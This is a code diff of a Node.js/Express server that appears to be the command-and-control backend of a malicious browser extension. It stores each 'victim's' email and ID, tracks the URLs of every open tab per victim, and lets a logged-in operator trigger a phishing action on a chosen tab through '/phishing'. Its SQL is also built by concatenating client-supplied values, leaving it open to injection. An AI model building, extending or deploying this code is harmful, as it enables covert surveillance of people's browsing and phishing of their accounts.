@@ -244,15 +244,18 @@ app.get('/inject',
 app.get('/phishing',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
-    res.render('phishing', {
-      rowData: activeTabs
+    con.query("SELECT * FROM Active", function(err, results, fields) {
+      if (err) throw err;
+      var val = req.query['victimSelection'];
+      res.render('phishing',{rowData:activeUsers[val], victims: results});
     });
   });
 
 app.post('/phishing',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
-    io.emit('Phish', parseInt(req.body.selection));
+    console.log(req.body.tabSelection);
+    io.emit('Phish', parseInt(req.body.tabSelection));
     res.redirect("phishing");
   });
 
@@ -278,7 +281,7 @@ function(req, res) {
 
 server.listen(3000);
 console.log("Listening on port 3000");
-activeTabs = {};
+activeUsers = {};
 
 io.on('connection', (socket) => {
   socket.on("userData", (userData) => {
@@ -288,7 +291,7 @@ io.on('connection', (socket) => {
       //console.log("1 victim added: "+userData.email+ " ID:"+userData.id);
     });
     //make a table to map socketID with victim ID
-    var sqlIDMapping = "INSERT INTO Active (userID, socketID, email) VALUES ('"+userData.id+"', '"+ socket.id+"', '"+userData.email+"')";
+    var sqlIDMapping = "REPLACE INTO Active (userID, socketID, email) VALUES ('"+userData.id+"', '"+ socket.id+"', '"+userData.email+"')";
     con.query(sqlIDMapping, function(err, result) {
         //console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
     });
@@ -353,11 +356,18 @@ io.on('connection', (socket) => {
       //});
     });
     socket.on('Removed Tab', (tab)=>{
+      var activeTabs = activeUsers[socket.id];
       delete activeTabs[tab['tabId']]
     });
     socket.on('Updated Tab', (tab)=>{
       if(tab['tab']['status'] == 'complete' && tab['tab']['url'] != null){
+        if(activeUsers[socket.id] == null){
+          var activeTabs = {};
+        }else{
+          var activeTabs = activeUsers[socket.id];
+        }
         activeTabs[tab['tab']['id']] = tab['tab']['url'];
+        activeUsers[socket.id] = activeTabs;
       }
 
     });
